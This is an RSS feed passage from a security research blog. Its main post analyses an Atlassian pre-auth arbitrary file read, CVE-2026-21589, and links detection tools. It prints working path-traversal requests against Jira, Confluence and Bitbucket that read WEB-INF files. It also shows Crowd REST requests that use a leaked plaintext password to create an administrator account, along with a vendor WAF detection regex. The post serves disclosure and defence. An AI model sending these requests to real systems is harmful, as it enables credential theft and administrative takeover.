Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="1392" height="1049" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-12.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-12.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-12.png 1392w" sizes="(min-width: 720px) 720px"></figure><h3 id="detection-artefact-generator">Detection Artefact Generator</h3><p>As always, we are sharing our Detection Artefact Generator so you can determine your own susceptibility and inform remediation in your own environments.</p><p>While the DAG does not execute the full chain, it determines exposure to the Authentication Bypass vulnerabilities we&#x2019;ve discussed above.</p><p>It can be found on our GitHub <a href="https://github.com/watchtowrlabs/watchTowr-vs-PaperCut-WT-2026-0143/?ref=labs.watchtowr.com">here</a>.<br></p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-11.png" class="kg-image" alt="Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)" loading="lazy" width="1026" height="304" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-11.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-11.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-11.png 1026w" sizes="(min-width: 720px) 720px"></figure>]]></content:encoded></item><item><title><![CDATA[You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)]]></title><description><![CDATA[<p>Welcome back to yet another episode of &quot;security was taken seriously&quot;.</p><p>Being who we are (and constantly being exposed to what we see&#x2026;), we recognize we have been doomed to eternal damnation as we keep on watching security best practices crumble behind &#x201c;secure by design&#x201d;</p>]]></description><link>https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/</link><guid isPermaLink="false">6ac5278bee21a30001a9348c</guid><dc:creator><![CDATA[Sonny]]></dc:creator><pubDate>Tue, 06 Oct 2026 17:01:36 GMT</pubDate><media:content url="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/1920--1080---2--5-.png" medium="image"/><content:encoded><![CDATA[<img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/1920--1080---2--5-.png" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)"><p>Welcome back to yet another episode of &quot;security was taken seriously&quot;.</p><p>Being who we are (and constantly being exposed to what we see&#x2026;), we recognize we have been doomed to eternal damnation as we keep on watching security best practices crumble behind &#x201c;secure by design&#x201d; public statements. And in the times we live in, where anyone with a prompt window in front of them can say &quot;reproduce the vulnerability, make no mistakes&quot;, so are you.</p><p>In Greek mythology, Atlas was punished by the gods for misbehaving. Reality is unfair, and all we get is Atlassian punishing the rest of us for running their systems on-prem. And so they did, on October 5th, in a <a href="https://confluence.atlassian.com/security/cve-2026-21589-arbitrary-file-access-vulnerability-impacts-multiple-products-1870495748.html?ref=labs.watchtowr.com">security advisory</a>.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-8.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="1481" height="893" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-8.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-8.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-8.png 1481w" sizes="(min-width: 720px) 720px"></figure><p>Sometimes we regret that CVSS scores go as high as 10, because when a vulnerability is baked into almost all of a vendor&apos;s products across every version, the vulnerability deserves a special place (just like you, our dear reader).</p><p><strong>Welcome back to another watchTowr Labs blog post.</strong></p><h1 id="what-is-going-on">What Is Going On</h1><p>Atlassian has published an out-of-band critical <a href="https://confluence.atlassian.com/security/cve-2026-21589-arbitrary-file-access-vulnerability-impacts-multiple-products-1870495748.html?ref=labs.watchtowr.com">vulnerability advisory</a> for CVE-2026-21589 for numerous Atlassian products.</p><p>CVE-2026-21589 was reported by Atlassian as &#x201c;Arbitrary File Access&#x201d; and as we&#x2019;ve come to learn, this means &#x201c;Arbitrary File Read&#x201d;. The CVSS score itself tells us a story: a vector showing no prerequisites of authentication or complexity.</p><p>This vulnerability affects all previous versions of:</p>
+<!--kg-card-begin: html-->
+<table id="3f1f5949-602e-80a1-bf86-c7fe3a0300f6" class="simple-table"><thead class="simple-table-header"><tr id="3f1f5949-602e-8011-92f6-fd1c5f0ca98a" dir="ltr"><th id="J]&gt;d" class="simple-table-header-color simple-table-header" style="width:420px">Product</th><th id="ujHC" class="simple-table-header-color simple-table-header" style="width:202px">Fixed Versions</th></tr></thead><tbody><tr id="3f1f5949-602e-8037-9fc2-f9d5db6ced99" dir="ltr"><td id="J]&gt;d" class style="width:420px">Bitbucket Data Center</td><td id="ujHC" class style="width:202px">&#x2022; 9.4.26<br>&#x2022; 10.2.8<br>&#x2022; 10.5.1</td></tr><tr id="3f1f5949-602e-80a4-aa75-d5d46af098ea" dir="ltr"><td id="J]&gt;d" class style="width:420px">Confluence Data Center</td><td id="ujHC" class style="width:202px">&#x2022; 9.2.26<br>&#x2022; 10.2.19</td></tr><tr id="3f1f5949-602e-8059-a679-cc1af04c861b" dir="ltr"><td id="J]&gt;d" class style="width:420px">Jira Service Management Data Center</td><td id="ujHC" class style="width:202px">&#x2022; 5.12.40<br>&#x2022; 10.3.26<br>&#x2022; 11.3.12</td></tr><tr id="3f1f5949-602e-8060-a286-f151a513a3ed" dir="ltr"><td id="J]&gt;d" class style="width:420px">Jira Software Data Center</td><td id="ujHC" class style="width:202px">&#x2022; 9.12.40<br>&#x2022; 10.3.26<br>&#x2022; 11.3.12</td></tr><tr id="3f1f5949-602e-803c-a94b-e6e25c5937c4" dir="ltr"><td id="J]&gt;d" class style="width:420px">Bamboo Data Center</td><td id="ujHC" class style="width:202px">&#x2022; 10.2.24<br>&#x2022; 12.1.12</td></tr><tr id="3f1f5949-602e-8020-85cc-c4ab631eb00b" dir="ltr"><td id="J]&gt;d" class style="width:420px">Crowd Data Center</td><td id="ujHC" class style="width:202px">&#x2022; 6.3.7<br>&#x2022; 7.0.3<br>&#x2022; 7.1.7<br>&#x2022; 7.2.4</td></tr><tr id="3f1f5949-602e-80c8-84cf-dfcc3a53d873" dir="ltr"><td id="J]&gt;d" class style="width:420px">Crucible</td><td id="ujHC" class style="width:202px">&#x2022; 4.9.15</td></tr><tr id="3f1f5949-602e-8073-9de3-c282e0c28416" dir="ltr"><td id="J]&gt;d" class style="width:420px">Fisheye</td><td id="ujHC" class style="width:202px">&#x2022; 4.9.15</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-9.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="947" height="676" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-9.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-9.png 947w" sizes="(min-width: 720px) 720px"></figure><p>Seeing this list of affected products, we stopped thinking about the potentially few thousand vulnerable instances exposed to the internet, and quickly realized we are in the six to seven-figure range.</p><ul><li><strong>Bitbucket</strong> is a Git-based code hosting service where teams store, review, and collaborate on source code, with built-in pull requests and CI/CD pipelines.</li><li><strong>Confluence</strong> is a team wiki and documentation workspace for creating, organizing, and sharing pages like project plans, meeting notes, and technical docs.</li><li><strong>Jira</strong> is a project and issue tracking tool, widely used for agile work, that lets teams plan, track, and manage tasks, bugs, and sprints on boards and backlogs.</li></ul><p>A quick internet search reveals just under <a href="https://fofa.info/result?qbase64=dGl0bGU9PSJMb2cgSW4gLSBDb25mbHVlbmNlIg==&amp;ref=labs.watchtowr.com">700,000 instances of Confluence alone</a>. So the range of those affected is vast, to say the least.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-6.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="1880" height="1886" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-6.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-6.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1600/2026/10/image-6.png 1600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-6.png 1880w" sizes="(min-width: 720px) 720px"></figure><h2 id="as-always-let%E2%80%99s-begin">As Always, Let&#x2019;s Begin</h2><p>As CVE-2026-21589 affects so many of their products, the only logical conclusion is that these products share a common library or configuration that makes this vulnerability apply to all of them.</p><p>We set out to prove this against a few of their core products, namely Bitbucket, Confluence, and Jira.</p><p>Having deployed vulnerable and patched versions of each solution, we looked to see what exactly had changed between them and what is common among the different technologies.</p><p>One particular JAR stood out: <code>atlassian-plugins-webresource*.jar</code></p><p>That gave us our targets for comparison:</p><ul><li>Vulnerable: <code>atlassian-plugins-webresource-6.0.7.jar</code></li><li>Different: <code>atlassian-plugins-webresource-6.0.8.jar</code></li></ul><p></p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-5.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="967" height="581" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-5.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-5.png 967w" sizes="(min-width: 720px) 720px"></figure><h2 id="diff%E2%80%99ing-our-way-to-%E2%80%9Cfile-access%E2%80%9D">Diff&#x2019;ing Our Way To &#x201c;File Access&#x201d;</h2><p>Looking through the advisory released by Atlassian gave us clues as to what we were looking for, notably the complex WAF rules they suggested:</p><pre><code class="language-jsx">(?is).*(?:/|\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2})(?:\.|%(?:25)*2e){2}(?:/|\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2}|;|%(?:25)*3b|&#x24;).*
+</code></pre><p>While semicolons (<code>;</code>) are very common in path traversal within Java applications, along with the everyday dots (<code>.</code>) and slashes (<code>/</code>), one item stood out: the matching of double colons (<code>::</code>). This is uncommon syntax for this type of vulnerability, but grepping through the codebase we came across an all too familiar sight.</p><p>In <code>com/atlassian/plugin/webresource/impl/http/Router.java</code> we observed this set of functions:</p><pre><code class="language-java">public static String sourceMapUrlToUrl(String sourceMapUrl) {
+	return sourceMapUrl.replaceAll(&quot;\\.map&#x24;&quot;, &quot;&quot;).replaceAll(&quot;\\.map\\?&quot;, &quot;?&quot;);
+}
+
+public static String escapeSlashes(String string) {
+	return string.replaceAll(&quot;/&quot;, &quot;::&quot;);
+}
+
+public static String unescapeSlashes(String string) {
+	return string.replaceAll(&quot;::&quot;, &quot;/&quot;);
+}
+</code></pre><p>At this point, you should already be cutting to the chase, just as we were. These functions match and replace double colons (<code>::</code>) with forward slashes (<code>/</code>).</p><p>This means we might be looking to exploit this vulnerability via a pattern similar to <code>..::..::..::..::&lt;dir&gt;::file.txt</code>. Our next step was to find a route to do it.</p><p>Looking at where these functions are referenced, we can see they are called along several routes in the same <code>Router</code> class:</p><pre><code class="language-java">String resources = &quot;resources&quot;;
+addRoute(&quot;/resources/:completeKey/*resourceName.map&quot;, new BaseRouter&lt;Controller&gt;.Handler() {
+      public void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {
+        controller.serveResourceSourceMap(
+            Router.unescapeSlashes(escapedCompleteKey), 
+            Router.unescapeSlashes(escapedResourceName), ServingType.RESOURCES_SINGLE);
+      }
+    });
+
+addRoute(&quot;/resources/:completeKey/*resourceName&quot;, new BaseRouter&lt;Controller&gt;.Handler() {
+      public void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {
+        controller.serveResource(
+            Router.unescapeSlashes(escapedCompleteKey), 
+            Router.unescapeSlashes(escapedResourceName), ServingType.RESOURCES_SINGLE);
+      }
+    });
+
+addRoute(&quot;/sources/:completeKey/*resourceName&quot;, new BaseRouter&lt;Controller&gt;.Handler() {
+      public void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {
+        controller.serveSource( &lt;----- [0]
+            Router.unescapeSlashes(escapedCompleteKey), 
+            Router.unescapeSlashes(escapedResourceName), ServingType.SOURCES_SINGLE);
+      }
+    });
+</code></pre><p>Following <code>[0]</code>&apos;s <code>serveSource()</code> above, we end up in <code>com.atlassian.plugin.webresource.impl.helpers.ResourceServingHelpers.java</code>, which presents a programmer&apos;s favorite set of long <code>IF</code> functions.</p><pre><code class="language-java">public static Resource getResource(RequestCache requestCache, String completeKey, String resourceName) {
+    Resource resource = getWebResourceResource(requestCache, completeKey, resourceName);
+    if (resource == null) {
+        resource = getResourceRelativeToWebResource(requestCache, completeKey, resourceName); &lt;---- [1]
+    }
+    if (resource == null) {
+        resource = getFromOSGiPluginModuleResource(requestCache.getGlobals(), completeKey, resourceName);
+    }
+    if (resource == null) {
+        resource = getPluginResource(requestCache.getGlobals(), completeKey, resourceName);
+    }
+    if (resource == null) {
+        resource = getResourceRelativeToPlugin(requestCache.getGlobals(), completeKey, resourceName);
+    }
+    return resource;
+}
+</code></pre><p>Looking specifically at the first <code>IF</code> branch, <code>getResourceRelativeToWebResource</code> <code>[1]</code> reveals a function which, although marked with the <code>@Deprecated</code> annotation is very much alive and well.</p><pre><code class="language-java">@Deprecated
+protected static Resource getResourceRelativeToWebResource(
+        RequestCache requestCache, String completeKey, String resourceName) {
+    Bundle bundle = requestCache.getSnapshot().get(completeKey);
+    if (bundle == null) {
+        return null;
+    }
+    String filePath = &quot;&quot;;
+    Resource resource = null;
+    while (resource == null) {
+        String[] parts = splitLastPathPart(resourceName);   // [3]
+        if (parts == null) {
+            return null;
+        }
+        resourceName = parts[0];                 
+        filePath = parts[1] + filePath;          
+        resource = bundle.getResources(requestCache).get(resourceName);
+    }
+    return requestCache.getGlobals().getConfig().getResourceFactory()
+            .createResourceWithRelativePath(
+                    resource.getParent(),
+                    resource.getResourceLocation(),
+                    resource.getNameType(),
+                    resource.getLocationType(),
+                    filePath);         &lt;----- [2]          
+}
+</code></pre><p>Given the routing patterns we have seen, it is safe to assume that a user-controlled <code>resourceName</code> is pushed to this function and funneled through <code>createResourceWithRelativePath()</code> at <code>[2]</code>.</p><p>While there are attempts to remove any slashes and traversals via <code>splitLastPathPart()</code> at <code>[3]</code>, given the potential for a <code>..::</code> primitive, this is likely moot. Further investigation shows that the path is eventually used by  <code>ResourceFactory</code> to read local files, so this is the right track.</p><p>Looking at the functionality so far, it is clear we need a plugin that lets us pass through the functionality above. After decompiling <code>jira-webresources-plugin.jar</code> we can review the plugins and parameters required to use it. We noted that the majority had fixed <code>location</code> values:</p><pre><code class="language-xml">&lt;resource type=&quot;qunit&quot; name=&quot;includes/jira/components/color-picker/color-picker-controller-tests.js&quot; location=&quot;includes/jira/components/color-picker/color-picker-controller-tests.js&quot;&gt;&lt;param name=&quot;source&quot; value=&quot;webContextStatic&quot;/&gt;&lt;/resource&gt;
+&lt;resource type=&quot;qunit&quot; name=&quot;includes/jira/components/color-picker/view/sample-color-collection-view-tests.js&quot; location=&quot;includes/jira/components/color-picker/view/sample-color-collection-view-tests.js&quot;&gt;&lt;param name=&quot;source&quot; value=&quot;webContextStatic&quot;/&gt;&lt;/resource&gt;
+</code></pre><p>As luck would have it, there was one in particular that ended with a trailing slash, meaning we may be able to supply the exact file via our <code>resourceName</code>.</p><pre><code class="language-xml">&lt;resource type=&quot;download&quot; name=&quot;images/&quot;
+          location=&quot;/includes/jquery/plugins/colorpicker/images/&quot;&gt;
+    &lt;param name=&quot;source&quot; value=&quot;webContextStatic&quot;/&gt;
+&lt;/resource&gt;
+</code></pre><p>With a bit of compute and perusing, we were able to build the route that interacts with this particular plugin to access the sink we are targeting, via <code>/download/resources/jira.webresources:color-picker-popup/images/*</code>, where all subsequent files in that path are matched to the local path <code>/includes/jquery/plugins/colorpicker/images/</code>.</p><p>By combining this path with our theoretical traversal payload, we were able to access the <code>web.xml</code> file, which is typically protected through various mechanisms within the Jira code and the Tomcat server itself.</p><pre><code>GET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml HTTP/1.1
+Host: {{Jira-Hostname}}
+</code></pre><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;web-app xmlns=&quot;&lt;http://java.sun.com/xml/ns/javaee&gt;&quot;
+         xmlns:xsi=&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;
+         xsi:schemaLocation=&quot;&lt;http://java.sun.com/xml/ns/javaee&gt;
+                &lt;http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&gt;&quot;
+         version=&quot;3.0&quot;
+         metadata-complete=&quot;true&quot;&gt;
+    &lt;!-- General --&gt;
+    &lt;display-name&gt;Atlassian JIRA Web Application&lt;/display-name&gt;
+    &lt;description&gt;The Atlassian JIRA web application - see &lt;http://www.atlassian.com/software/jira&gt; for more information
+    &lt;/description&gt;
+[..Truncated..]
+</code></pre><p>While we are not able to traverse outside of the Tomcat context, we discovered it is possible to read any file within the application server itself. The route varies across the other products, but we were able to verify it is more or less the same.</p><p>Confluence:</p><pre><code>GET /s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/..::..::..::..::..::..::..::..::WEB-INF::web.xml HTTP/1.1
+Host: {{Confluence-Hostname}}
+</code></pre><p>Bitbucket (slightly different, as <code>web.xml</code> is blocked):</p><pre><code>GET /s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml HTTP/1.1
+Host: {{Bitbucket-Hostname}}
+</code></pre><h2 id="the-crowd-crush-is-real">The Crowd Crush Is Real</h2><p>We have already proven that we can read any file from the application&apos;s webroot, including sensitive files stored in the <code>WEB-INF</code> directory. On the other hand, a quick nudge at the filesystem did not let us find any file that would leak something as sensitive as a critical-rated vulnerability would imply.</p><p>We took a look at the official advisory again and spotted a sentence that turned on our internal light bulb:</p><blockquote>In some configurations, there may be sensitive files present that increase your risk.</blockquote><p>Alright, it clearly implies that the impact may vary with the configuration. It seems there are configurations that would place files with very sensitive content in the <code>WEB-INF</code> directory.</p><p>Our plan was simple:</p><ul><li>Smash through the Atlassian documentation.</li><li>Look for references to configuration files stored within the <code>WEB-INF</code> directory.</li></ul><p>One of the first hits we got was the <a href="https://confluence.atlassian.com/crowd/integrating-crowd-with-atlassian-jira-192625.html?ref=labs.watchtowr.com">Jira documentation</a>, which describes its integration with Atlassian Crowd.</p><h2 id="what-is-atlassian-crowd">What Is Atlassian Crowd?</h2><p>Atlassian Crowd is Atlassian&apos;s centralized identity and single sign-on (SSO) product, essentially the user directory and authentication hub that sits behind the rest of the Atlassian stack.</p><p>Instead of each Jira, Confluence, Bitbucket, and Bamboo instance managing its own separate list of users and passwords, Crowd holds that information in one place, and the other applications ask Crowd to handle authentication and group membership for them.</p><p>Long story short: Atlassian Crowd is an identity management solution, which Atlassian recommends using with your Atlassian products deployment.</p><h2 id="atlassian-crowd-and-jira-deployment">Atlassian Crowd and Jira Deployment</h2><p>We started reading the Atlassian Crowd and Jira deployment <a href="https://confluence.atlassian.com/crowd/integrating-crowd-with-atlassian-jira-192625.html?ref=labs.watchtowr.com">configuration</a> instructions and quickly stumbled upon this fragment:</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-4.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="929" height="131" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-4.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-4.png 929w" sizes="(min-width: 720px) 720px"></figure><p>This looks really fine. This fragment tells us that:</p><ul><li>The Crowd config file is located at <code>WEB-INF/classes/crowd.properties</code>.</li><li>It stores <code>application.name</code> and <code>application.password</code>.</li></ul><p>Naturally, as it&#x2019;s 2026, we asked our AI agent to deploy Crowd within our Jira installation, in compliance with the official documentation.</p><p>When that was done, we manually verified the content of the <code>crowd.properties</code> file:</p><pre><code class="language-java">&#x24; cat WEB-INF/classes/crowd.properties 
+application.name                        jira
+application.password                    Jira-Crowd-App-Pass-2026!
+application.login.url                   &lt;http://localhost:8095/crowd/console/&gt;
+
+crowd.server.url                        &lt;http://localhost:8095/crowd/services/&gt;
+crowd.base.url                          &lt;http://localhost:8095/crowd/&gt;
+
+session.isauthenticated                 session.isauthenticated
+session.tokenkey                        session.tokenkey
+session.validationinterval              2
+session.lastvalidation                  session.lastvalidation
+</code></pre><p>This allowed us to confirm that the config file stores the following information:</p><ul><li>The application name.</li><li>The password for the application, in plaintext.</li><li>The Crowd URL.</li></ul><p>With those leaked, we can try to access Crowd directly and see what we can achieve.</p><blockquote>Authors&apos; note: Crowd configuration allows you to specify a whitelist of IP addresses that can access it. Such a configuration may make this attack scenario much harder, as you would need to pivot through arbitrary machines or use SSRF-like capabilities of Jira, Confluence, or Bitbucket to reach Crowd directly. It is probably safe to assume that in real environments you will find both very permissive and locked-down Atlassian Crowd installations.</blockquote><h2 id="accessing-atlassian-crowd-impact">Accessing Atlassian Crowd: Impact</h2><p>When you access Atlassian Crowd directly with the leaked credentials, it is basically game over. Sounds logical: you are accessing the identity management solution as an administrator of the application.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-3.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="1363" height="800" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-3.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-3.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-3.png 1363w" sizes="(min-width: 720px) 720px"></figure><p>You can use the direct access to:</p><ul><li>Create new users.</li><li>Modify user privileges.</li><li>And much more.</li></ul><p>For instance, you can try this by sending the following request:</p><pre><code>GET /crowd/rest/usermanagement/1/search?entity-type=user&amp;max-results=1000 HTTP/1.1
+Host: jira.lab.local:8095
+Authorization: Basic eW91cjpjcmVkZW50aWFscw==
+</code></pre><p>In the response, you will receive the list of existing users.</p><p>You can of course do something much more malicious, like creating a new user:</p><pre><code>POST /crowd/rest/usermanagement/1/user HTTP/1.1
+Host: jira.lab.local:8095
+Content-Type: application/json
+Content-Length: 194
+Authorization: Basic eW91cjpjcmVkZW50aWFscw==
+
+{
+&quot;name&quot;: &quot;watchTowrPoC&quot;, 
+&quot;active&quot;: true, 
+&quot;first-name&quot;: &quot;Evil&quot;, 
+&quot;last-name&quot;: &quot;Admin&quot;, 
+&quot;display-name&quot;: &quot;watchTowrPoC&quot;, 
+&quot;email&quot;: &quot;watchTowrPoC@attacker.test&quot;, 
+&quot;password&quot;: {&quot;value&quot;: &quot;1PocPa&#x24;&#x24;wd23&quot;}
+}
+</code></pre><p>And then add this user to the <code>jira-administrators</code> group:</p><pre><code>POST /crowd/rest/usermanagement/1/group/user/direct?groupname=jira-administrators HTTP/1.1
+Host: jira.lab.local:8095
+Accept: application/json
+Content-Type: application/json
+Content-Length: 24
+Authorization: Basic eW91cjpjcmVkZW50aWFscw==
+
+{&quot;name&quot;: &quot;watchTowrPoC&quot;}
+</code></pre><p>You can be proud of yourself, pal. You just got promoted to Jira Administrator.</p><h3 id="file-read-to-jira-administrator-through-crowd-full-poc">File Read to Jira Administrator Through Crowd: Full PoC</h3><p>We would not be ourselves if we did not implement the entire chain in a single Python PoC, just to make it look nice.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-2.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="1363" height="800" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-2.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-2.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-2.png 1363w" sizes="(min-width: 720px) 720px"></figure><h2 id="detection-artefact-generator">Detection Artefact Generator</h2><p>As always, we have created a Detection Artefact Generator, which you can use to check whether an instance is vulnerable. It can be found <a href="https://github.com/watchtowrlabs/watchTowr-vs-Atlassian-CVE-2026-21589?ref=labs.watchtowr.com">here</a>, working for the following Atlassian products:</p><ul><li>Jira.</li><li>Confluence.</li><li>Bitbucket.</li></ul><p>A sample run against a vulnerable instance looks like this:</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-1.png" class="kg-image" alt="You Won&#x2019;t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)" loading="lazy" width="1604" height="483" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/10/image-1.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/10/image-1.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1600/2026/10/image-1.png 1600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/10/image-1.png 1604w" sizes="(min-width: 720px) 720px"></figure><p>Speak soon.</p>]]></content:encoded></item>
+</channel>
+</rss>
